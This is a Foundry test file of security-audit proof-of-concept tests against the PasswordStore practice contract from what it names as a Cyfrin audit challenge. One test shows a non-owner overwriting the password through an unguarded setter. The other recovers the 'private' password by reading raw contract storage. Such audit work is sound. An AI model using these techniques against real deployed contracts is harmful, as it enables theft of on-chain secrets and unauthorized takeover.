// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PasswordStore} from "../src/PasswordStore.sol";
import {DeployPasswordStore} from "../script/DeployPasswordStore.s.sol";

/**
 * @title PasswordStore — Proof-of-Concept tests
 * @notice Standalone PoCs for the two High-severity findings reported in
 *         findings-report.md. Drop this file into the official Cyfrin
 *         challenge repo (github.com/Cyfrin/2023-10-PasswordStore) under
 *         `test/` and run:
 *
 *             forge test --match-contract PasswordStorePoC -vv
 *
 *         Both tests PASS, which proves each vulnerability is exploitable.
 */
contract PasswordStorePoC is Test {
    PasswordStore public passwordStore;
    DeployPasswordStore public deployer;
    address public owner;

    function setUp() public {
        deployer = new DeployPasswordStore();
        passwordStore = deployer.run();
        owner = msg.sender;
    }

    /// @notice H-1: anyone (not just the owner) can set the password.
    function test_anyone_can_set_password() public {
        // Arrange: impersonate a random non-owner attacker.
        address randomAttacker = address(1);
        vm.startPrank(randomAttacker);

        // Act: the attacker overwrites the password without authorization.
        string memory attackerPassword = "hackedByAttacker";
        passwordStore.setPassword(attackerPassword);
        vm.stopPrank();

        // Assert: the real owner now reads the attacker-controlled value.
        vm.startPrank(owner);
        string memory actualPassword = passwordStore.getPassword();
        assertEq(actualPassword, attackerPassword); // passes => bug proven
        vm.stopPrank();
    }

    /// @notice H-2: the `private` password is readable directly from storage.
    function test_password_is_not_really_private() public {
        // Arrange: the owner stores a secret password.
        vm.startPrank(owner);
        string memory secret = "myTopSecret";
        passwordStore.setPassword(secret);
        vm.stopPrank();

        // Act: read storage slot 1 directly (s_owner is slot 0, s_password is slot 1).
        bytes32 data = vm.load(address(passwordStore), bytes32(uint256(1)));

        // For short strings, the last byte holds (length * 2).
        uint256 length = (uint256(data) & 0xff) / 2;
        bytes memory passwordBytes = new bytes(length);
        for (uint256 i = 0; i < length; i++) {
            passwordBytes[i] = data[i];
        }
        string memory leaked = string(passwordBytes);
        console.log("Leaked password:", leaked);

        // Assert: the "private" value is recovered in plaintext.
        assertEq(leaked, secret); // passes => bug proven
    }
}
